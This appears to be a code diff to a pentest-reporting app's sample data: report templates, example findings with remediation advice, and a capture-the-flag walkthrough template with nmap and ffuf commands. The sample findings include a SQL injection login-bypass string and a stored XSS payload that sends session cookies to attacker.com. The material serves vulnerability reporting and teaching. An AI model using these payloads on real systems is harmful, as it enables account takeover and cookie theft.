@@ -15,12 +15,7 @@ export const projects: Project[] = [
     id: 'proj-1', 
     clientId: 'cli-htb', 
     name: 'Q3 Web App Pentest', 
-    reportBody: `## Executive Summary
-This report outlines the results of an external penetration test conducted on the internet-facing assets of **Innovatech Solutions**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.
-
----
-
-## Scope & Methodology
+    reportBody: `## Scope
 The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).
 
 ### Scope
@@ -33,21 +28,19 @@ The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]
 3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
 4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.
 
----
-
 ## Attack Narrative
 The engagement began with reconnaissance against the *.innovatech.com domain, which revealed the existence of an outdated blog at 'blog.innovatech.com' and a development server at 'dev.innovatech.com' with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.
 
----
-
 ## Findings Classification
+
 | Severity | CVSS v3.1 Score | Description |
-|---|---|---|
-| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
-| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
-| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
-| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
-| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
+|:---|---|:---|
+| <span style="color:red">Critical</span> | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
+| <span style="color:orange">High</span> | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
+| <span style="color:yellow">Medium</span> | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
+| <span style="color:blue">Low</span> | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
+| <span style="color:gray">Informational</span> | 0.0 | Observations about the external footprint of the organization. |
+`, 
     startDate: '2023-07-01', 
     endDate: '2023-07-15', 
     status: 'Completed', 
@@ -82,23 +75,15 @@ export const findings: Finding[] = [
     markdown: `### Overview
 A critical SQL Injection vulnerability was identified in the main login form of the application. This flaw allows an attacker to bypass authentication mechanisms and gain unauthorized access to the application, potentially with administrative privileges.
 
----
-
 ### Technical Description
 The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).
-
----
 
 ### Affected Components
 - \`/auth/login\` endpoint
 - User authentication module
 
----
-
 ### Impact
 Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full application compromise, data exfiltration, and further attacks against the underlying infrastructure.
-
----
 
 ### Immediate Actions
 Implement parameterized queries (prepared statements) to handle all user-supplied input in database queries. This is the most effective way to prevent SQL Injection attacks. Validate and sanitize all user input on the server side as a defense-in-depth measure.`, 
@@ -115,23 +100,15 @@ Implement parameterized queries (prepared statements) to handle all user-supplie
     markdown: `### Overview
 A stored XSS vulnerability exists in the user profile section, allowing an attacker to inject malicious scripts that execute in the browsers of other users, including administrators.
 
----
-
 ### Technical Description
 The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.
-
----
 
 ### Affected Components
 - User profile page (e.g., /profile/{userId})
 - 'bio' field update functionality
 
----
-
 ### Impact
 This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.
-
----
 
 ### Immediate Actions
 Implement context-aware output encoding for all user-supplied data before it is rendered in the browser. Use a library like DOMPurify to sanitize HTML content if users are allowed to submit rich text.`, 
@@ -864,7 +841,7 @@ export const vulnerabilities: Vulnerability[] = [
       details_en: "### Details (PoC, Evidence)\n[TODO: Provide a PoC, evidence, or detailed steps to reproduce the vulnerability.]",
       details_es: "### Detalles (PoC, Evidencia)\n[TODO: Proporcionar una PoC, evidencia o pasos detallados para reproducir la vulnerabilidad.]",
       references: ["https://www.sans.org/posters/firewall-packet-filtering/"],
-      tags: ["Network", "Configuration"],
+      tags: ["Infrastructure", "Configuration"],
       ...emptyVulnBoilerplate
     },
     {
@@ -1314,30 +1291,42 @@ export const projectTemplates: ProjectTemplate[] = [
     description_en: 'A comprehensive security assessment for web applications, covering OWASP Top 10 and other common vulnerabilities.',
     description_es: 'Una evaluación de seguridad completa para aplicaciones web, cubriendo el OWASP Top 10 y otras vulnerabilidades comunes.',
     icon: 'Scan',
-    scope_en: `## Scope
-- **Application URL:** [TODO: Add application URL, e.g., https://example.com]
-- **Testing Period:** [TODO Start Date] to [TODO End Date]
-- **Credentials:** [TODO: Specify credentials if provided, e.g., user, admin]
-- **Exclusions:** [TODO: Specify any out-of-scope targets, e.g., *.blog.example.com]
+    scope_en: `## Introduction
+This report details the findings of an external penetration test performed on the internet-facing assets of **[TODO: Client Name]**. The assessment took place from **[TODO: Start Date]** to **[TODO: End Date]**.
 
-## Methodology
-The assessment will follow a standard web application penetration testing methodology, including:
-1.  **Reconnaissance:** Information gathering about the application and infrastructure.
-2.  **Automated Scanning:** Using tools to identify low-hanging fruit.
-3.  **Manual Testing:** In-depth testing for complex vulnerabilities such as business logic flaws, access control issues, and injection attacks.
-4.  **Reporting:** Documentation of findings and remediation recommendations.`,
-    scope_es: `## Alcance
-- **URL de la Aplicación:** [TODO: Añadir URL de la aplicación, p.ej., https://ejemplo.com]
-- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
-- **Credenciales:** [TODO: Especificar credenciales si se proporcionaron, p.ej., usuario, administrador]
-- **Exclusiones:** [TODO: Especificar objetivos fuera de alcance, p.ej., *.blog.ejemplo.com]
+## Scope & Methodology
+The assessment was performed from a black-box perspective, meaning no prior knowledge of the internal infrastructure or source code was provided. The scope was limited to the following assets:
+- [TODO: List of assets, e.g., *.example.com]
 
-## Metodología
-La evaluación seguirá una metodología estándar de pruebas de penetración de aplicaciones web, que incluye:
-1.  **Reconocimiento:** Recopilación de información sobre la aplicación y la infraestructura.
-2.  **Escaneo Automatizado:** Uso de herramientas para identificar vulnerabilidades de bajo esfuerzo.
-3.  **Pruebas Manuales:** Pruebas en profundidad para vulnerabilidades complejas como fallos de lógica de negocio, problemas de control de acceso y ataques de inyección.
-4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
+## Attack Narrative
+[TODO: Provide a high-level summary of the attack path and key findings.]
+
+## Findings Classification
+| Severity | CVSS v3.1 Score | Description |
+|:---|---|:---|
+| <span style="color:red">Critical</span> | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise. |
+| <span style="color:orange">High</span> | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access. |
+| <span style="color:yellow">Medium</span> | 4.0 - 6.9 | Weaknesses that could reveal sensitive information. |
+| <span style="color:blue">Low</span> | 0.1 - 3.9 | Minor issues that reduce the overall security posture. |
+| <span style="color:gray">Informational</span> | 0.0 | Observations about the external footprint. |`,
+    scope_es: `## Introducción
+Este informe detalla los hallazgos de una prueba de penetración externa realizada sobre los activos de **[TODO: Nombre del Cliente]** expuestos a internet. La evaluación se llevó a cabo desde el **[TODO: Start Date]** hasta el **[TODO: End Date]**.
+
+## Alcance y Metodología
+La evaluación se realizó desde una perspectiva de caja negra, lo que significa que no se proporcionó conocimiento previo de la infraestructura interna ni del código fuente. El alcance se limitó a los siguientes activos:
+- [TODO: Lista de activos, p.ej., *.ejemplo.com]
+
+## Narrativa del Ataque
+[TODO: Proporcionar un resumen de alto nivel de la ruta de ataque y los hallazgos clave.]
+
+## Clasificación de Hallazgos
+| Severidad | Puntuación CVSS v3.1 | Descripción |
+|:---|---|:---|
+| <span style="color:red">Crítica</span> | 9.0 - 10.0 | Vulnerabilidades que podrían llevar a un compromiso inmediato del sistema. |
+| <span style="color:orange">Alta</span> | 7.0 - 8.9 | Vulnerabilidades que podrían permitir a un atacante obtener acceso no autorizado. |
+| <span style="color:yellow">Media</span> | 4.0 - 6.9 | Debilidades que podrían revelar información sensible. |
+| <span style="color:blue">Baja</span> | 0.1 - 3.9 | Problemas menores que reducen la postura de seguridad general. |
+| <span style="color:gray">Informativa</span> | 0.0 | Observaciones sobre la huella externa. |`,
     appendix_en: `### Appendix
 A combination of automated tools and manual techniques were used to perform this assessment.
 - **Proxy:** Burp Suite Professional
@@ -1491,8 +1480,6 @@ El objetivo fue realizar una prueba de penetración, identificando y explotando 
 - **Difficulty:** [TODO: Select Difficulty]
 - **Date:** ${format(new Date(), 'dd-MM-yyyy')}
 
----
-
 ## Initial Reconnaissance
 
 ### Add IP to /etc/hosts
@@ -1512,8 +1499,6 @@ sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: IP Address]
 sudo nmap -sCV -p22,80 [TODO: IP Address] -oN targeted
 \`\`\`
 *Result: Found ports 22 (SSH) and 80 (HTTP) open.*
-
----
 
 ## Web Enumeration
 
@@ -1556,8 +1541,6 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 \`\`\`
 *Found subdomain: [TODO: e.g., grafana.planning.htb]. Added to /etc/hosts.*
 
----
-
 ## Exploitation
 
 ### Vulnerability Research
@@ -1571,16 +1554,12 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 ### Exploit Execution
 [TODO: Step-by-step description of how the exploit was executed to gain initial access.]
 
----
-
 ## Initial Access
 - **User:** \`whoami\` -> [TODO: user]
 - **Environment:** \`uname -a\`, \`id\`, \`sudo -l\`
 
 ### User Flag
 - **Command:** \`cat /home/[TODO: user]/user.txt\`
-
----
 
 ## Privilege Escalation
 
@@ -1596,8 +1575,6 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 ### Applied Technique
 [TODO: Describe the technique used: SUID binary, misconfigured cronjob, hardcoded credentials, etc.]
 
----
-
 ## 👑 Root Flag
 - **Command:** \`cat /root/root.txt\`
 `,
@@ -1607,8 +1584,6 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 - **Sistema Operativo:** Linux
 - **Dificultad:** [TODO: Seleccionar Dificultad]
 - **Fecha:** ${format(new Date(), 'dd-MM-yyyy')}
-
----
 
 ## Reconocimiento Inicial
 
@@ -1629,8 +1604,6 @@ sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: Dirección IP]
 sudo nmap -sCV -p22,80 [TODO: Dirección IP] -oN targeted
 \`\`\`
 *Resultado: Se encontraron los puertos 22 (SSH) y 80 (HTTP) abiertos.*
-
----
 
 ## Enumeración Web
 
@@ -1673,8 +1646,6 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 \`\`\`
 *Subdominio encontrado: [TODO: p.ej., grafana.planning.htb]. Añadido a /etc/hosts.*
 
----
-
 ## Explotación
 
 ### Investigación de Vulnerabilidades
@@ -1688,16 +1659,12 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 ### Ejecución del Exploit
 [TODO: Descripción paso a paso de cómo se ejecutó el exploit para obtener acceso inicial.]
 
----
-
 ## Acceso Inicial
 - **Usuario:** \`whoami\` -> [TODO: usuario]
 - **Entorno:** \`uname -a\`, \`id\`, \`sudo -l\`
 
 ### Bandera de Usuario (User Flag)
 - **Comando:** \`cat /home/[TODO: usuario]/user.txt\`
-
----
 
 ## Escalada de Privilegios
 
@@ -1712,8 +1679,6 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 
 ### Técnica Aplicada
 [TODO: Describir la técnica usada: binario SUID, cronjob mal configurado, credenciales hardcoded, etc.]
-
----
 
 ## 👑 Root Flag
 - **Comando:** \`cat /root/root.txt\`
@@ -1732,6 +1697,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 ];
 
   
+
 
 
 
